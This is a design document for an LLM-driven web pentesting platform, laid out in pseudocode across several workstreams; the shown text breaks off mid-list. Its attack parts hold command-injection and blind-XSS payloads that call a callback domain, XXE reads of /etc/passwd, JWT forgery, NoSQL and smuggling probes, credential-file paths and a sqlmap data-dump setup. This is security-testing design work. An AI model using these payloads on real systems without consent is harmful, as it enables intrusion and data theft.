# AEGIS 10/10: Complete Pentesting Platform — Low-Level Design

**Date:** 2026-02-22
**Status:** Draft
**Scope:** Transform AEGIS from a localhost fuzzer into a complete, production-grade pentesting platform that competes with Burp Suite Pro ($499/yr), Acunetix ($4,500/yr), and Invicti ($6,000/yr). Every gap closed. LLM-enhanced throughout.

## Design Principles

1. **Wrap, don't rewrite** — Use battle-tested tools (sqlmap, nuclei, interactsh, nmap, subfinder, testssl.sh) as subprocesses. Parse their output into the knowledge graph.
2. **Build natively when trivial** — Directory brute-forcing, header analysis, CORS checking, JWT decoding are simple HTTP operations. No external dependency needed.
3. **Wire before building** — 6 existing features are implemented but disconnected. Connect them first.
4. **LLM at every decision point** — The LLM doesn't just generate payloads; it decides what to do next, which tool to run, how to interpret results, and how to write the report.
5. **Maximize findings per engagement** — Every feature evaluated by "does this find billable issues?"

---

## Architecture Overview

```
                    +---------------------------+
                    |     LLM Decision Engine    |
                    |  (hypothesis-engine +      |
                    |   strategy/triage/report)  |
                    +-------------+-------------+
                                  |
              +-------------------+-------------------+
              |                   |                    |
     +--------v-------+  +-------v--------+  +-------v--------+
     |  crates/proxy   |  | crates/discovery|  |crates/exploiter|
     | (hudsucker MITM)|  | (brute-force,  |  | (sqlmap,nuclei,|
     | request repeater|  |  JS extract,   |  |  interactsh,   |
     | traffic record) |  |  param disc.)  |  |  jwt_tool)     |
     +--------+-------+  +-------+--------+  +-------+--------+
              |                   |                    |
              +-------------------+--------------------+
                                  |
                    +-------------v-------------+
                    |     Knowledge Graph        |
                    |  (unified state store)     |
                    +-------------+-------------+
                                  |
         +----------+------+------+------+-----------+
         |          |      |      |      |           |
     +---v--+  +---v--+ +-v---+ +v----+ +v-------+ +v----------+
     |fuzzing|  |evasion| |enum| |recon| |chain-  | |reporting  |
     |+oracle|  |engine | |    | |     | |synth   | |+compliance|
     +------+  +------+ +----+ +-----+ +--------+ +-----------+
```

---

## WORKSTREAM 1: Wire Existing Disconnected Features

These features are already implemented but not connected to the pipeline. Highest ROI work — zero new code design needed, just integration.

### 1A. Wire Browser Crawling

**Current state:** `crates/crawler/` exists with `chromiumoxide`-based BFS crawler. `pipeline.rs` creates `CrawlResult::default()` (always empty).

**Change:** Replace `CrawlResult::default()` with actual crawler invocation.

**Pseudocode:**
```
FUNCTION run_crawl_phase(ctx):
    IF ctx.config.skip_crawl:
        RETURN empty CrawlResult

    crawler = Crawler::new(
        seed_url = ctx.config.target,
        max_depth = 3,
        max_pages = 500,
        scope = ctx.config.target domain only
    )

    crawl_result = crawler.crawl()

    FOR endpoint IN crawl_result.discovered_endpoints:
        ADD Endpoint node to knowledge graph
        SET properties: path, method, parameters, discovery_source=Crawl

    FOR form IN crawl_result.forms:
        ADD Endpoint node with method=POST, parameters from form inputs

    RETURN crawl_result
```

**Integration point:** `pipeline.rs` between fingerprint and fuzz phases.

### 1B. Wire Defense Fingerprinting

**Current state:** `DefenseProfile` types exist in `aegis-fuzzing`. WAF detection, rate limit probing, bot detection code exists. Pipeline creates `DefenseProfile::empty()`.

**Change:** Call defense fingerprinting before fuzz phase, populate real profile.

**Pseudocode:**
```
FUNCTION run_defense_fingerprint(ctx):
    waf_result = waf_fingerprinter.probe(ctx.config.target)
    rate_result = rate_limit_detector.probe(ctx.config.target)
    bot_result = bot_detection_probe.probe(ctx.config.target)

    profile = DefenseProfile::new()
        .with_waf(waf_result)
        .with_rate_limit(rate_result)
        .with_bot_detection(bot_result)

    ctx.defense_profile = profile

    // Adjust stealth config based on detected defenses
    IF profile.has_waf:
        ctx.stealth = ctx.stealth.with_evasion_payloads(true)
    IF profile.rate_limit_rps.is_some():
        ctx.stealth = ctx.stealth.with_max_rps(profile.rate_limit_rps * 0.8)
    IF profile.bot_detection_present:
        ctx.stealth = ctx.stealth.with_persona_rotation(true)
```

### 1C. Wire Interactive Mode

**Current state:** `interactive.rs` has full command parser and session management. Zero calls from pipeline or main.

**Change:** Add `--interactive` flag. When set, start interactive session alongside pipeline.

**Pseudocode:**
```
FUNCTION run_scan_with_interactive(ctx):
    session = InteractiveSession::new(ctx)

    SPAWN background thread:
        LOOP:
            command = read_line_from_stdin()
            response = session.handle_command(parse_command(command))
            print(response)

    run_scan_phases(ctx)  // existing pipeline, now pausable
```

### 1D. Wire Pipeline Composer

**Current state:** `pipeline_composer.rs` has DAG validation and topological sort. Pipeline uses hardcoded phase sequence.

**Change:** Define pipeline as `PipelineDefinition`, use topological ordering.

### 1E. Wire DOM XSS Verification

**Current state:** `phase_dom_verify.rs` returns 0 findings always.

**Change:** Use crawler's browser to inject XSS payloads into DOM and check if they execute.

**Pseudocode:**
```
FUNCTION run_dom_verify(ctx):
    xss_findings = ctx.graph.findings_by_class(CrossSiteScripting)

    FOR finding IN xss_findings:
        page = browser.navigate(finding.endpoint)
        inject payload into DOM via parameter
        check if alert() / custom callback fires
        IF fires:
            UPGRADE finding evidence to Confirmed
            SET finding.dom_verified = true
```

### 1F. Wire Telemetry

**Current state:** `TelemetryCollector` types exist. Never instantiated.

**Change:** Create collector at pipeline start, record events in each phase.

---

## WORKSTREAM 2: New Crate — `crates/discovery`

Content/endpoint discovery beyond what enumeration crate provides. Focused on finding attack surface that crawling and API specs miss.

### 2A. Directory Brute-Forcing

**Pseudocode:**
```
STRUCT DirectoryBruster:
    client: HttpClient
    wordlist: Vec<String>          // loaded from SecLists or custom
    extensions: Vec<String>        // [".php", ".asp", ".jsp", ".bak", ".old", ".env"]
    concurrency: usize             // default 20 threads
    filter_codes: HashSet<u16>     // ignore 404, configurable
    filter_size: Option<usize>     // ignore responses of this exact size (custom 404 pages)

FUNCTION brute_force(target_url, wordlist_path):
    wordlist = load_wordlist(wordlist_path)
    baseline_404 = GET(target_url + "/definitely-not-a-real-path-xyz")

    FOR EACH word IN wordlist, CONCURRENT(20):
        FOR EACH ext IN ["", ".php", ".asp", ".bak", ".env", ".json"]:
            url = target_url + "/" + word + ext
            response = GET(url)

            IF response.status NOT IN filter_codes
               AND response.body_size != baseline_404.body_size:
                ADD to discovered_paths
                ADD Endpoint node to knowledge graph

    RETURN discovered_paths
```

**Wordlists bundled:** Ship a curated default wordlist (~5K entries from SecLists common.txt). Allow `--wordlist` override for custom lists.

### 2B. JavaScript Endpoint Extraction

**Pseudocode:**
```
FUNCTION extract_js_endpoints(crawl_result):
    FOR EACH js_url IN crawl_result.js_sources:
        js_content = GET(js_url)

        // Regex patterns for API endpoints in JavaScript
        patterns = [
            r#"["'](/api/[a-zA-Z0-9/_-]+)["']"#,           // "/api/users"
            r#"fetch\(["']([^"']+)["']"#,                   // fetch("/endpoint")
            r#"axios\.(get|post|put|delete)\(["']([^"']+)"#, // axios.get("/endpoint")
            r#"\.ajax\(\{[^}]*url:\s*["']([^"']+)"#,       // $.ajax({url: "/endpoint"})
            r#"XMLHttpRequest.*?open\(["'][A-Z]+["'],\s*["']([^"']+)"#,
            r#"(https?://[a-zA-Z0-9._-]+/[a-zA-Z0-9/_-]+)"#, // full URLs
        ]

        FOR EACH pattern IN patterns:
            FOR EACH match IN regex_find_all(pattern, js_content):
                IF match is relative URL:
                    resolve against target_url
                ADD Endpoint node to knowledge graph
                    SET discovery_source = JavaScriptAnalysis
```

### 2C. Parameter Discovery

**Pseudocode:**
```
FUNCTION discover_parameters(endpoint):
    common_params = ["id", "user", "name", "email", "page", "limit",
                     "sort", "order", "search", "q", "query", "filter",
                     "token", "key", "callback", "redirect", "url",
                     "file", "path", "dir", "action", "type", "format"]

    baseline = GET(endpoint)

    FOR EACH param IN common_params, CONCURRENT(10):
        response = GET(endpoint + "?" + param + "=test123")
        IF response differs from baseline (status, size, content):
            ADD param to discovered_parameters
            UPDATE Endpoint node with new parameter
```

### 2D. Technology Fingerprinting

**Pseudocode:**
```
FUNCTION fingerprint_technology(target_url):
    response = GET(target_url)

    // Check response headers
    tech_signals = {}
    IF "X-Powered-By" IN response.headers:
        tech_signals["framework"] = response.headers["X-Powered-By"]
    IF "Server" IN response.headers:
        tech_signals["server"] = response.headers["Server"]

    // Check HTML content against Wappalyzer signatures
    // (Load signatures from bundled wappalyzer-technologies.json)
    FOR EACH technology IN wappalyzer_signatures:
        IF technology.html_pattern matches response.body
           OR technology.header_pattern matches response.headers
           OR technology.cookie_pattern matches response.cookies
           OR technology.js_pattern matches response.js_variables:
            tech_signals[technology.name] = technology.version or "detected"

    // Check common framework-specific paths
    framework_checks = {
        "/wp-admin/": "WordPress",
        "/wp-login.php": "WordPress",
        "/_next/": "Next.js",
        "/__nuxt/": "Nuxt.js",
        "/elmah.axd": "ASP.NET",
        "/rails/info": "Ruby on Rails",
    }

    FOR EACH path, framework IN framework_checks:
        IF GET(target_url + path).status == 200:
            tech_signals["framework"] = framework

    RETURN TechFingerprint(signals=tech_signals)
```

### 2E. Sitemap / Robots.txt Parsing

**Pseudocode:**
```
FUNCTION parse_sitemap_and_robots(target_url):
    // robots.txt
    robots = GET(target_url + "/robots.txt")
    IF robots.status == 200:
        FOR EACH line IN robots.body.lines():
            IF line starts with "Disallow:":
                path = extract_path(line)
                ADD to discovery queue  // disallowed paths are often interesting
            IF line starts with "Sitemap:":
                sitemap_url = extract_url(line)
                parse_sitemap_xml(sitemap_url)

    // sitemap.xml
    sitemap = GET(target_url + "/sitemap.xml")
    IF sitemap.status == 200 AND is_xml(sitemap.body):
        FOR EACH <loc> IN parse_xml(sitemap.body):
            ADD URL to knowledge graph as Endpoint
```

### 2F. Backup File Enumeration

**Pseudocode:**
```
FUNCTION enumerate_backup_files(target_url, known_endpoints):
    sensitive_paths = [
        "/.env", "/.env.bak", "/.env.local", "/.env.production",
        "/.git/config", "/.git/HEAD",
        "/.svn/entries",
        "/web.config", "/web.config.bak",
        "/.htaccess", "/.htpasswd",
        "/wp-config.php.bak", "/wp-config.php.old",
        "/database.yml", "/config/database.yml",
        "/backup.sql", "/dump.sql", "/db.sql",
        "/.DS_Store",
        "/server-status", "/server-info",
        "/phpinfo.php",
        "/crossdomain.xml",
        "/clientaccesspolicy.xml",
    ]

    FOR EACH known_path IN known_endpoints:
        // Generate backup variants
        ADD known_path + ".bak"
        ADD known_path + ".old"
        ADD known_path + ".orig"
        ADD known_path + "~"
        ADD known_path + ".swp"
        ADD known_path + ".save"

    FOR EACH path IN sensitive_paths + generated_variants:
        response = GET(target_url + path)
        IF response.status == 200 AND response.body is not custom_404:
            CREATE InformationDisclosure finding
            SET severity based on content type (credentials=Critical, source=High, config=Medium)
```

### 2G. Virtual Host Discovery

**Pseudocode:**
```
FUNCTION discover_virtual_hosts(target_ip, target_domain):
    vhost_wordlist = ["admin", "api", "dev", "staging", "test", "internal",
                      "beta", "portal", "dashboard", "mail", "vpn", "git",
                      "jenkins", "ci", "cd", "monitor", "grafana", "kibana"]

    baseline = GET(target_ip, Host: target_domain)

    FOR EACH prefix IN vhost_wordlist:
        vhost = prefix + "." + target_domain
        response = GET(target_ip, Host: vhost)
        IF response differs from baseline (status, size, content):
            ADD vhost to discovered_vhosts
            LOG "Virtual host discovered: {vhost}"
```

---

## WORKSTREAM 3: New Crate — `crates/proxy`

MITM intercepting proxy using `hudsucker` library. Provides Burp-style interactive testing capabilities.

### 3A. Proxy Core

**Dependencies:** `hudsucker` (Rust MITM proxy with TLS interception), `rcgen` (CA cert generation), `tokio`

**Pseudocode:**
```
STRUCT AegisProxy:
    listen_addr: SocketAddr           // default 127.0.0.1:8080
    ca_cert: Certificate              // generated on first run, user installs in browser
    ca_key: PrivateKey
    intercept_enabled: AtomicBool     // toggle interception on/off
    request_log: Arc<RwLock<Vec<RecordedExchange>>>
    knowledge_graph: Arc<RwLock<KnowledgeGraph>>
    filters: Vec<InterceptFilter>     // which requests to intercept
    breakpoints: Vec<BreakpointRule>  // pause on matching requests

STRUCT RecordedExchange:
    id: u64
    request: HttpRequest              // method, url, headers, body
    response: HttpResponse            // status, headers, body
    timestamp: Instant
    tags: Vec<String>                 // user annotations
    modified: bool                    // was this request modified by user?

FUNCTION start_proxy(config):
    generate CA cert if not exists
    print "Install CA cert from: ~/.aegis/ca-cert.pem"

    proxy = hudsucker::Proxy::builder()
        .with_ca(ca_cert, ca_key)
        .with_request_handler(on_request)
        .with_response_handler(on_response)
        .build()

    proxy.listen(config.listen_addr)

FUNCTION on_request(request):
    // Record every request
    exchange = RecordedExchange::new(request)
    request_log.push(exchange)

    // Feed into knowledge graph
    add_endpoint_to_graph(request.url, request.method)

    // Check breakpoints
    IF any breakpoint matches request:
        PAUSE, present to user for modification
        modified_request = wait_for_user_input()
        RETURN modified_request

    // Check intercept toggle
    IF intercept_enabled:
        present request to user
        RETURN user_modified_or_original

    RETURN request  // pass through

FUNCTION on_response(response, exchange):
    exchange.response = response
    // Run passive analysis on every proxied response
    run_passive_checks(exchange)
    RETURN response
```

### 3B. Repeater

**Pseudocode:**
```
FUNCTION repeater(exchange_id, modifications):
    original = request_log.get(exchange_id)
    request = apply_modifications(original.request, modifications)
    response = send_request(request)
    RETURN (request, response, diff(original.response, response))
```

### 3C. Intruder (Parameterized Attack)

**Pseudocode:**
```
ENUM AttackMode:
    Sniper          // one payload position at a time, all others original
    BatteringRam    // same payload in all positions simultaneously
    Pitchfork       // parallel iteration through multiple payload lists
    ClusterBomb     // cartesian product of all payload lists

FUNCTION intruder(template_request, positions, payload_lists, mode):
    template = mark_positions(template_request, positions)
    // positions are marked with {0}, {1}, etc. in the request

    payloads = generate_combinations(payload_lists, mode)

    results = []
    FOR EACH payload_set IN payloads, CONCURRENT(config.threads):
        request = substitute_positions(template, payload_set)
        response = send_request(request)
        results.push(IntruderResult(
            payload=payload_set,
            status=response.status,
            length=response.body.len(),
            response=response,
        ))

    RETURN results sorted by anomaly_score
```

### 3D. Traffic to Knowledge Graph Integration

**Pseudocode:**
```
FUNCTION sync_proxy_to_graph(proxy, graph):
    // Background task: periodically sync proxy traffic into knowledge graph
    EVERY 5 seconds:
        new_exchanges = proxy.request_log.drain_unsynced()
        FOR EACH exchange IN new_exchanges:
            // Add endpoint if not exists
            ensure_endpoint_node(graph, exchange.request.url, exchange.request.method)

            // Extract parameters from request
            FOR EACH param IN extract_params(exchange.request):
                add_parameter_to_endpoint(graph, endpoint_id, param)

            // Run passive vuln checks on response
            passive_findings = passive_analyze(exchange)
            FOR EACH finding IN passive_findings:
                add_finding_to_graph(graph, finding)
```

---

## WORKSTREAM 4: New Crate — `crates/exploiter`

Subprocess wrapper framework for exploitation tools. Normalizes output into knowledge graph operations.

### 4A. Tool Wrapper Framework

**Pseudocode:**
```
TRAIT ToolWrapper:
    fn name() -> &str
    fn is_available() -> bool               // check if tool is installed
    fn build_command(finding, config) -> Command
    fn parse_output(stdout, stderr) -> Vec<ExploitResult>
    fn timeout() -> Duration

STRUCT ExploitResult:
    tool: String
    finding_id: u64                         // which finding triggered this
    success: bool
    evidence: String                        // proof of exploitation
    extracted_data: Option<String>          // e.g., database dump preview
    severity_upgrade: Option<f64>           // suggest higher severity based on impact
    poc_command: String                     // reproducible PoC for the report

FUNCTION run_exploitation(finding, available_tools):
    // LLM decides which tool to use
    tool = llm.select_tool(finding, available_tools)

    IF tool is None:
        RETURN  // no suitable tool

    command = tool.build_command(finding, config)
    (stdout, stderr) = run_subprocess(command, timeout=tool.timeout())
    results = tool.parse_output(stdout, stderr)

    FOR EACH result IN results:
        IF result.success:
            UPDATE finding with exploit evidence
            IF result.severity_upgrade:
                UPDATE finding severity
```

### 4B. SQLMap Wrapper

**Pseudocode:**
```
STRUCT SqlmapWrapper

IMPL ToolWrapper FOR SqlmapWrapper:
    fn name() -> "sqlmap"

    fn is_available():
        RETURN which("sqlmap") exists

    fn build_command(finding, config):
        // Build sqlmap command from finding context
        cmd = "sqlmap"
        cmd += " -u " + finding.endpoint + "?" + finding.parameter + "=test"
        cmd += " --batch"            // non-interactive
        cmd += " --output-dir=" + temp_dir
        cmd += " --forms"            // test forms too
        cmd += " --level=3"          // thorough
        cmd += " --risk=2"           // moderate risk payloads
        cmd += " --threads=4"
        cmd += " --technique=BEUSTQ" // all techniques
        cmd += " --dbs"              // enumerate databases
        cmd += " --dump --dump-format=CSV"  // extract data sample

        IF config.auth_cookie:
            cmd += " --cookie=" + config.auth_cookie

        RETURN cmd

    fn parse_output(stdout, stderr):
        // sqlmap outputs structured results
        results = []
        IF "is vulnerable" IN stdout:
            result = ExploitResult(
                success=true,
                evidence=extract_between(stdout, "[INFO]", "[WARNING]"),
                extracted_data=read_file(temp_dir + "/dump/..."),
                severity_upgrade=9.0,  // confirmed SQLi with data extraction = Critical
                poc_command=extract_poc_from_log(stdout),
            )
            results.push(result)
        RETURN results
```

### 4C. Nuclei Wrapper

**Pseudocode:**
```
STRUCT NucleiWrapper

IMPL ToolWrapper FOR NucleiWrapper:
    fn build_command(target, tech_fingerprint):
        cmd = "nuclei"
        cmd += " -u " + target
        cmd += " -jsonl"             // JSON Lines output
        cmd += " -severity critical,high,medium"
        cmd += " -silent"

        // Select templates based on tech fingerprint
        IF "WordPress" IN tech_fingerprint:
            cmd += " -tags wordpress"
        IF "Apache" IN tech_fingerprint:
            cmd += " -tags apache"
        // ... etc for each detected technology

        RETURN cmd

    fn parse_output(stdout):
        results = []
        FOR EACH line IN stdout.lines():
            json = parse_json(line)
            result = ExploitResult(
                tool="nuclei",
                success=true,
                evidence=json["matched-at"] + ": " + json["info"]["description"],
                severity_upgrade=map_nuclei_severity(json["info"]["severity"]),
                poc_command="nuclei -u " + target + " -t " + json["template-id"],
            )
            results.push(result)
        RETURN results
```

### 4D. Interactsh Wrapper (OAST)

**Pseudocode:**
```
STRUCT InteractshWrapper:
    server_url: String              // self-hosted or oast.pro
    correlation_id: String          // unique per scan
    polling_interval: Duration      // check for interactions every 5s

FUNCTION setup_oast():
    // Start interactsh client
    client = interactsh_client.new(server_url)
    oast_domain = client.get_domain()   // e.g., "abc123.oast.pro"
    RETURN oast_domain

FUNCTION generate_oast_payloads(oast_domain, vuln_class):
    MATCH vuln_class:
        BlindSsrf:
            RETURN ["http://" + oast_domain + "/ssrf",
                    "https://" + oast_domain + "/ssrf"]
        BlindXxe:
            RETURN ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://' + oast_domain + '/xxe">]>&xxe;']
        BlindCmdInj:
            RETURN ["$(curl " + oast_domain + "/cmd)",
                    "; nslookup " + oast_domain,
                    "| wget http://" + oast_domain + "/cmd"]
        BlindXss:
            RETURN ['<script src=//' + oast_domain + '/xss></script>',
                    '<img src=x onerror=fetch("//' + oast_domain + '/xss")>']
        BlindSsti:
            RETURN framework-specific payloads that trigger outbound request

FUNCTION poll_interactions(client, timeout):
    interactions = []
    WHILE elapsed < timeout:
        new = client.poll()
        FOR EACH interaction IN new:
            interactions.push(OastInteraction(
                type=interaction.protocol,      // DNS, HTTP, SMTP
                source_ip=interaction.remote_ip,
                payload_id=extract_from_path(interaction.full_path),
                timestamp=interaction.timestamp,
            ))
        SLEEP polling_interval
    RETURN interactions

FUNCTION correlate_oast_findings(interactions, sent_payloads):
    FOR EACH interaction IN interactions:
        matching_payload = sent_payloads.find(interaction.payload_id)
        IF matching_payload:
            CREATE confirmed finding:
                vuln_class = matching_payload.vuln_class
                evidence = "Out-of-band " + interaction.type + " interaction detected"
                evidence_level = Confirmed
                confidence = 0.95
```

### 4E. Nmap Wrapper

**Pseudocode:**
```
STRUCT NmapWrapper

IMPL ToolWrapper FOR NmapWrapper:
    fn build_command(target_host):
        cmd = "nmap"
        cmd += " -sV"               // service version detection
        cmd += " -sC"               // default scripts
        cmd += " --top-ports 1000"
        cmd += " -oX -"             // XML output to stdout
        cmd += " " + target_host
        RETURN cmd

    fn parse_output(stdout):
        xml = parse_xml(stdout)
        services = []
        FOR EACH port IN xml.findall("host/ports/port"):
            services.push(DiscoveredService(
                port=port.attr("portid"),
                protocol=port.attr("protocol"),
                service=port.find("service").attr("name"),
                version=port.find("service").attr("product") + " " + .attr("version"),
                state=port.find("state").attr("state"),
            ))
        RETURN services
```

### 4F. Subfinder Wrapper

**Pseudocode:**
```
STRUCT SubfinderWrapper

IMPL ToolWrapper FOR SubfinderWrapper:
    fn build_command(domain):
        RETURN "subfinder -d " + domain + " -silent -json"

    fn parse_output(stdout):
        subdomains = []
        FOR EACH line IN stdout.lines():
            json = parse_json(line)
            subdomains.push(json["host"])
        RETURN subdomains
```

### 4G. JWT Tool Wrapper

**Pseudocode:**
```
STRUCT JwtToolWrapper

FUNCTION test_jwt(token):
    results = []

    // Test 1: alg:none
    forged = set_jwt_header(token, {"alg": "none"})
    forged = remove_signature(forged)
    response = send_with_token(forged)
    IF response.status == 200:
        results.push(JwtVulnerability(type="alg_none", severity=Critical))

    // Test 2: Weak secret brute-force
    common_secrets = ["secret", "password", "123456", "changeme",
                      "jwt_secret", "supersecret", app_name, domain_name]
    FOR EACH secret IN common_secrets:
        IF verify_jwt(token, secret):
            forged = sign_jwt(modify_claims(token, {role: "admin"}), secret)
            response = send_with_token(forged)
            IF response.status == 200:
                results.push(JwtVulnerability(type="weak_secret",
                    secret=secret, severity=Critical))
            BREAK

    // Test 3: RS256 to HS256 confusion
    IF token.header.alg == "RS256":
        pubkey = fetch_jwks_public_key(target)
        IF pubkey:
            forged = sign_jwt_hs256(modify_claims(token), pubkey_bytes)
            response = send_with_token(forged)
            IF response.status == 200:
                results.push(JwtVulnerability(type="algorithm_confusion",
                    severity=Critical))

    // Test 4: Expired token acceptance
    IF token is expired:
        response = send_with_token(token)
        IF response.status == 200:
            results.push(JwtVulnerability(type="expired_accepted",
                severity=Medium))

    // Test 5: Claim manipulation
    FOR EACH claim IN ["role", "admin", "is_admin", "user_type"]:
        IF claim IN token.payload:
            modified = set_claim(token, claim, "admin")
            // Re-sign if we found the secret
            IF known_secret:
                forged = sign_jwt(modified, known_secret)
                response = send_with_token(forged)
                IF response differs from original:
                    results.push(JwtVulnerability(type="claim_manipulation",
                        claim=claim, severity=High))

    RETURN results
```

---

## WORKSTREAM 5: New Vulnerability Classes + Detection

Add to `VulnerabilityClass` enum and implement payloads + detection for each.

### 5A. NoSQL Injection

**Payloads:**
```
MongoDB operator injection:
    {"username": {"$ne": ""}, "password": {"$ne": ""}}
    {"username": {"$gt": ""}, "password": {"$gt": ""}}
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
    {"$where": "1==1"}
    {"$where": "sleep(5000)"}     // time-based
    username[$ne]=&password[$ne]= // query string form

Cassandra CQL:
    ' OR 1=1 ALLOW FILTERING--
```

**Detection:** Error patterns (MongoError, CastError, BSONTypeError), boolean differential, time delay.

### 5B. XXE (XML External Entity)

**Payloads:**
```
// In-band (file read)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

// Blind (OAST)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://OAST_DOMAIN/xxe">]>
<root>&xxe;</root>

// Billion laughs DoS (careful — only in controlled environments)
// Parameter entity
// XInclude
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Detection:** File content in response (/etc/passwd patterns), OAST callback, XML parser error messages.

### 5C. CORS Misconfiguration

**Pseudocode:**
```
FUNCTION test_cors(endpoint):
    findings = []

    // Test 1: Reflected origin
    response = GET(endpoint, Origin: "https://evil.com")
    acao = response.headers["Access-Control-Allow-Origin"]
    IF acao == "https://evil.com":
        findings.push(CORS finding, severity=High if credentials allowed)

    // Test 2: Null origin
    response = GET(endpoint, Origin: "null")
    IF response.headers["Access-Control-Allow-Origin"] == "null":
        findings.push(CORS finding, severity=Medium)

    // Test 3: Wildcard with credentials
    response = GET(endpoint, Origin: "https://anything.com")
    IF acao == "*" AND response.headers["Access-Control-Allow-Credentials"] == "true":
        findings.push(CORS finding, severity=High)

    // Test 4: Subdomain trust
    response = GET(endpoint, Origin: "https://evil." + target_domain)
    IF acao == "https://evil." + target_domain:
        findings.push(CORS finding, severity=Medium, note="trusts any subdomain")

    RETURN findings
```

### 5D. Security Header Analysis (Passive)

**Pseudocode:**
```
FUNCTION analyze_security_headers(response):
    findings = []

    required_headers = {
        "Strict-Transport-Security": {
            missing_severity: Medium,
            check: LAMBDA h: "max-age=" IN h AND parse_max_age(h) >= 31536000,
            weak_message: "HSTS max-age should be >= 1 year"
        },
        "Content-Security-Policy": {
            missing_severity: Medium,
            check: LAMBDA h: "unsafe-inline" NOT IN h AND "unsafe-eval" NOT IN h,
            weak_message: "CSP contains unsafe-inline or unsafe-eval"
        },
        "X-Frame-Options": {
            missing_severity: Low,
            check: LAMBDA h: h IN ["DENY", "SAMEORIGIN"],
            weak_message: "X-Frame-Options should be DENY or SAMEORIGIN"
        },
        "X-Content-Type-Options": {
            missing_severity: Low,
            check: LAMBDA h: h == "nosniff",
        },
        "Referrer-Policy": {
            missing_severity: Low,
            check: LAMBDA h: h IN ["no-referrer", "same-origin", "strict-origin",
                                    "strict-origin-when-cross-origin"],
        },
        "Permissions-Policy": {
            missing_severity: Informational,
            check: LAMBDA h: true,  // any policy is better than none
        },
    }

    FOR EACH header, config IN required_headers:
        IF header NOT IN response.headers:
            findings.push(MissingSecurityHeader(header, config.missing_severity))
        ELSE IF NOT config.check(response.headers[header]):
            findings.push(WeakSecurityHeader(header, config.weak_message))

    // Cookie analysis
    FOR EACH cookie IN response.cookies:
        IF NOT cookie.secure:
            findings.push(InsecureCookie(cookie.name, "Missing Secure flag"))
        IF NOT cookie.http_only:
            findings.push(InsecureCookie(cookie.name, "Missing HttpOnly flag"))
        IF cookie.same_site IS None:
            findings.push(InsecureCookie(cookie.name, "Missing SameSite attribute"))

    // Information disclosure in headers
    IF "Server" IN response.headers AND contains_version(response.headers["Server"]):
        findings.push(InformationDisclosure("Server header reveals version"))
    IF "X-Powered-By" IN response.headers:
        findings.push(InformationDisclosure("X-Powered-By header present"))

    RETURN findings
```

### 5E. HTTP Request Smuggling

**Pseudocode:**
```
FUNCTION test_request_smuggling(target):
    findings = []

    // CL.TE probe
    request = build_raw_request(
        method="POST", url=target,
        headers={
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
        },
        body="0\r\n\r\nX"  // X is the smuggled prefix
    )
    (response, timing) = send_raw(request)
    IF timing > 5_seconds:  // back-end hung waiting for chunk data
        findings.push(HttpRequestSmuggling(type="CL.TE", severity=High))

    // TE.CL probe
    request = build_raw_request(
        method="POST", url=target,
        headers={
            "Content-Length": "3",
            "Transfer-Encoding": "chunked",
        },
        body="8\r\nSMUGGLED\r\n0\r\n\r\n"
    )
    (response, timing) = send_raw(request)
    IF timing > 5_seconds:
        findings.push(HttpRequestSmuggling(type="TE.CL", severity=High))

    // TE.TE obfuscation variants
    te_variants = [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: chunked\x00",
    ]
    FOR EACH variant IN te_variants:
        // test CL vs obfuscated TE
        ...

    RETURN findings
```

### 5F. Race Condition Testing

**Pseudocode:**
```
FUNCTION test_race_conditions(endpoints):
    findings = []

    // Identify candidate endpoints (state-changing operations)
    candidates = endpoints.filter(e =>
        e.method IN ["POST", "PUT", "DELETE", "PATCH"]
        AND e.path matches patterns like /transfer, /purchase, /redeem, /vote, /apply
    )

    FOR EACH endpoint IN candidates:
        // Send N identical requests simultaneously
        N = 10
        requests = [build_request(endpoint)] * N

        responses = send_all_concurrent(requests)  // tokio::join! all at once

        // Analyze: did the server process multiple when it should process one?
        success_count = responses.count(r => r.status IN [200, 201, 204])
        IF success_count > 1:
            findings.push(RaceCondition(
                endpoint=endpoint,
                concurrent_successes=success_count,
                severity=High,
                evidence="Sent {N} concurrent requests, {success_count} succeeded"
            ))

    RETURN findings
```

### 5G. IDOR Testing

**Pseudocode:**
```
FUNCTION test_idor(endpoints, auth_contexts):
    // auth_contexts = {user_a: {cookie/token}, user_b: {cookie/token}}
    // If only one user context: test authenticated vs unauthenticated
    findings = []

    // Identify endpoints with ID-like parameters
    id_patterns = [
        regex("[?&](id|user_id|account_id|order_id)=(\d+)"),
        regex("/(\d+)$"),                     // trailing numeric ID
        regex("/([a-f0-9-]{36})"),            // UUID in path
    ]

    FOR EACH endpoint IN endpoints:
        FOR EACH pattern IN id_patterns:
            IF pattern matches endpoint:
                original_id = extract_id(endpoint, pattern)

                // Test 1: Access with different user's session
                IF len(auth_contexts) >= 2:
                    response_a = GET(endpoint, auth=user_a)
                    response_b = GET(endpoint, auth=user_b)

                    IF response_b.status == 200 AND response_b.body != response_a.body:
                        findings.push(IDOR(
                            endpoint=endpoint,
                            type="horizontal",
                            severity=High,
                            evidence="User B can access User A's resource"
                        ))

                // Test 2: Increment/decrement ID
                FOR EACH delta IN [-1, +1, -10, +10]:
                    modified_id = original_id + delta
                    modified_endpoint = replace_id(endpoint, original_id, modified_id)
                    response = GET(modified_endpoint, auth=user_a)

                    IF response.status == 200:
                        findings.push(IDOR(
                            endpoint=modified_endpoint,
                            type="enumeration",
                            severity=High,
                            evidence="Accessing ID {modified_id} succeeds for user with ID {original_id}"
                        ))

                // Test 3: Unauthenticated access
                response = GET(endpoint, auth=None)
                IF response.status == 200:
                    findings.push(IDOR(
                        endpoint=endpoint,
                        type="unauthenticated",
                        severity=Critical,
                    ))

    RETURN findings
```

### 5H. Mass Assignment Testing

**Pseudocode:**
```
FUNCTION test_mass_assignment(endpoints, auth_context):
    findings = []

    // Target PUT/PATCH/POST endpoints
    candidates = endpoints.filter(e => e.method IN ["PUT", "PATCH", "POST"])

    privilege_fields = ["role", "isAdmin", "is_admin", "admin", "type",
                        "user_type", "permissions", "verified", "active",
